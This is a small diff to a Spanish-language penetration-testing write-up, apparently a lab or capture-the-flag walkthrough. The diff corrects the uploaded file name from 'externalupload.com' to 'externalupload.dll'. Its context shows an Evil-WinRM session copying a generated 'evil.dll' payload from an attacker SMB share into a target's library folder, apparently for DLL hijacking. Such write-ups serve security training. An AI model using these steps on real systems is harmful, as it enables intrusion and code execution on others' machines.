@@ -818,7 +818,7 @@ Final size of dll file: 9216 bytes
 Saved as: evil.dll
 ```
 
-Ahora subimos el DLL como `externalupload.com`.
+Ahora subimos el DLL como `externalupload.dll`.
 ```console
 *Evil-WinRM* PS C:\Program Files\ReportManagement\Libraries> copy \\10.10.14.104\smbFolder\evil.dll externalupload.dll
 *Evil-WinRM* PS C:\Program Files\ReportManagement\Libraries> dir
